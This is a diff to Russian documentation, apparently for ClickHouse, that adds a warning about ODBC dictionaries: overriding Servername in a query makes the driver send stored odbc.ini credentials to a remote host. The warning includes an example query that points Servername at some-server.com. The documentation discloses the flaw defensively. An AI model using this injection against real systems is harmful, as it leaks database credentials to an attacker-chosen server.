@@ -124,6 +124,34 @@
 -   `connection_string` - строка соединения.
 -   `invalidate_query` - запрос для проверки статуса словаря. Необязательный параметр. Читайте подробнее в разделе [Обновление словарей](external_dicts_dict_lifetime.md#dicts-external_dicts_dict_lifetime).
 
+### Выявленная уязвимость в функционировании ODBC словарей
+
+!!! attention
+    При соединении с базой данных через ODBC можно заменить параметр соединения `Servername`. В этом случае, значения `USERNAME` и `PASSWORD` из `odbc.ini` отправляются на удаленный сервер и могут быть скомпроментированы.
+
+**Пример небезопасного использования**
+
+Сконфигурируем unixODBC для работы с PostgreSQL. Содержимое `/etc/odbc.ini`:
+
+```
+[gregtest]
+Driver = /usr/lib/psqlodbca.so
+Servername = localhost
+PORT = 5432
+DATABASE = test_db
+#OPTION = 3
+USERNAME = test
+PASSWORD = test
+```
+
+Если выполнить запрос вида:
+
+```
+SELECT * FROM odbc('DSN=gregtest;Servername=some-server.com', 'test_db');    
+```
+
+то ODBC драйвер отправит значения `USERNAME` и `PASSWORD` из `odbc.ini` на `some-server.com`.
+
 ### Пример подключения PostgreSQL
 
 ОС Ubuntu.
@@ -203,7 +231,7 @@
 Настройка драйвера: :
 
 ```
-    $ cat /etc/freetds/freetds.conf 
+    $ cat /etc/freetds/freetds.conf
     ...
 
     [MSSQL]
@@ -212,7 +240,7 @@
     tds version = 7.0
     client charset = UTF-8
 
-    $ cat /etc/odbcinst.ini 
+    $ cat /etc/odbcinst.ini
     ...
 
     [FreeTDS]
@@ -222,7 +250,7 @@
     FileUsage       = 1
     UsageCount      = 5
 
-    $ cat ~/.odbc.ini 
+    $ cat ~/.odbc.ini
     ...
 
     [MSSQL]
